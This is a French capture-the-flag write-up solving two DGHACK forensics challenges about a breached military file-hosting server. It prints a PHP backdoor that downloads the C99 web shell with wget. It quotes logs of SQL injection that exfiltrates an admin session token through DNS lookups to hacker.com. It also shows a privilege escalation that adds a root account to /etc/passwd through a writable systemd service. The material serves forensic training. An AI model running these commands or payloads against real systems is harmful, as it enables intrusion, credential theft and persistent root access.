50 POINTS

## Description
Après une fuite d'information sur l'internet : https://pastebin.com/WfPgGMSn. Un service d'hébergement anonyme pour les militaires français s'est fait attaquer. Le système permet le téléchargement de fichiers top secret protégés par le système S.O.P.H.I.A. Le système a besoin d'un identifiant de fichier puis d'un mot de passe d'accès.

Il semblerait que la sécurité sur la base de données n'était pas suffisamment élevée. Un premier administrateur est intervenu pour réparer la vulnérabilité et supprimer la backdoor PHP. Aidez-le en détectant l'intrusion sur le serveur et essayez de comprendre ce que le hacker a exfiltré.

Enregistrez le flag avec le modèle ci-après : DGHACK{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...}

Information: utilisez les options suivantes avec la commande ssh pour éviter les déconnexions :

`ssh <address> -p <port> -o ServerAliveInterval=30 -o ServerAliveCountMax=2`

## Solution

Le pastebin donne les infos suivantes :

```
C0M1N7-5H4D0W4D64
TCOGVVQV:W6W9D3A/60/RC=
```

Le site permet de télécharger un fichier si on connait le code du fichier et un mot de passe. C'est sûrement ce qu'il y a d'écrit sur le pastebin.

En rentrant ces information, on obtient un fichier pdf contenant un identifiant et un mot de passe pour se connecter à l'interface admin du site.

```
En date du premier trimestre de l’année 2022, le service
de la sécurité de défense et des systèmes d’information
décident de produire le nouveau système d’hébergement de
fichier anonyme pour le ministère des armées françaises.
Le projet TRES SECRET DEFENSE susnommé “SHADOW4DGA”
devient la nouvelle plateforme pour les échanges en
opération.

Pour la phase de test, les développeurs ont mis a dispo-
sition un utilisateur de type “observateur” pour avoir la
liste des fichiers hébergés. Toutefois, le mot de passe
de l’utilisateur “admin” reste confidentiel pour des
mesures de sécurité.

Veuillez utiliser les accès ci-dessous :

Username=ob4shadow
Password=5H@D0W_4_0853rV470r
```

On se connecte et on obtient une liste de fichiers existant que l'on peut télécharger. On note également une fonction pour upload des fichiers qui est réservée à l'utilisateur admin.

Ces fichiers sont des fichiers wikileaks mais il n'y a rien d'intéressant pour le challenge.

Cependant, l'URL est de la forme suivante :

`http://siteweb-shadow4dga-server-jbf9wf.inst.malicecyber.com/admin.php?limit=5&offset=0`

En augmentant la limite à 100, on trouve 2 fichiers supplémentaires : un autre fichier comique probablement inutile et un 2e fichier impossible à télécharger (peut-être une backdoor ?)


Connexion ssh avec le compte app :

`ssh app@ssh-shadow4dga-server-mqag6p.inst.malicecyber.com -p 4100 -o ServerAliveInterval=30 -o ServerAliveCountMax=2`
mdp : S0C_ShAd0W4DgA/0042


Dans le fichier admin.php, on trouve le cookie de l'administrateur qui est hardcodé :

`session = b86eb8dae7809614b94dda9116a68f4a71a25cfe9e9a0b4f53621d87110930848204f157efc3defd5afb5b8b2fb9f6f560d26dc425532f1a77bc8ae3e07fcfc6`

Le dernier fichier (CR4T0G9U) est bien un reverse shell :

```
<?php
$output=null;
$retval=null;
exec('wget https://raw.githubusercontent.com/KaizenLouie/C99Shell-PHP7/master/c99shell.php', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
```

Dans les logs, on trouve :

```
174.10.50.30 - - [17/Jun/2022:21:24:57 +0200] "GET /admin.php?limit=10&offset=0)UNION(SELECT%200,(select%20session%20from%20users%20where%20username='admin'),test;-- HTTP/1.1" 500 5 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:26:57 +0200] "GET /admin.php?limit=10&offset=0);CREATE%20PROCEDURE%20exf(data%20varchar(100))%20BEGIN%20SELECT%20LOAD_FILE(CONCAT('%5C%5C',data,'%5Ca'));END;select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:28:57 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf('beginexf.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:31:02 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),1,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:31:07 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),1,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:31:08 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),1,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:33:13 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),64,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:33:18 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),64,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 499 0 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
174.10.50.30 - - [17/Jun/2022:21:33:19 +0200] "GET /admin.php?limit=10&offset=0);CALL%20exf(CONCAT(SUBSTRING((select%20session%20from%20users%20where%20username='admin'),64,63),'.hacker.com'));select%200,NULL,NULL;-- HTTP/1.1" 200 6236 "-" "Mozilla/0.0 (Windows NT 0.0; Win99; x12) AppleWebKit/007.01 (KHTML, like Gecko) Chrome/01.1.1234.12 Safari/007.01" "-"
```

On comprend alors que l'attaquant a exfiltré le token de session de l'administrateur. D'après la consigne, on en déduit que le flag est :

**DGHACK{b86eb8dae7809614b94dda9116a68f4a71a25cfe9e9a0b4f53621d87110930848204f157efc3defd5afb5b8b2fb9f6f560d26dc425532f1a77bc8ae3e07fcfc6}**

------------------------
100 POINTS


## Description
Après le piratage du service d'hébergement anonyme pour les militaires français. Il semblerait que le pirate a réussi à élever ses privilèges pour installer une porte dérobée persistante pour l'utilisateur root.

Détectez l'intrusion avancée sur le serveur et essayez de comprendre ce que le pirate a exfiltré.

## Solution

On trouve ensuite une backdoor laissée par l'attaquant :

```
app@malice:/$ cat /etc/systemd/system/systembd.service
[Unit]
Description=backdoor
After=network.target

[Service]
User=root
Type=simple
ExecStart=/root/bd.sh
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target
```

On peut modifier ce service !!!

```
app@malice:~$ cat /etc/systemd/system/systembd.service 
[Service]
User=root
Type=oneshot
RemainAfterExit=yes
ExecStart=/home/app/script.sh
app@malice:~$ cat script.sh 
#!/bin/bash
sed -i '$ d' /etc/passwd && sed -i '$ d' /etc/passwd
echo 'app:x:0:0:app,,,:/home/app:/bin/bash' >> /etc/passwd
echo 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin' >> /etc/passwd
```

J'ajoute app comme root

Une fois root, je trouve dans le fichier `/root/.local/share/Trash/setup.php.swp` qui est un fichier temporaire vim et qui contient le code utilisé pour setup le site.

Dedans, on trouve le mdp admin avec un commentaire qui indique que ce mdp est réutilisé pour un "vault".

```
$admin_password = hash("sha512", "m?btM0e@1Zy@uqEkYJ@eUo0A8@q@ya");
// $admin_password is the same password for the global vault
```

Un fichier `vault` est présent à la racine. La commande `file` indique qu'il s'agit d'une archive zip.

On dezip, un mot de passe est demandé. En rentrant celui obtenu précédemment, on obtient l'image `DGHACK{tres_secret_defense}.png`

Rien d'anormal au premier regard. Cependant quand on filtre pour la technique du LSB (grâce à un site comme Aprikube), on obtient le flag !!

**DGHACK{L'empire_du_milieu_c@che_les_@liens}**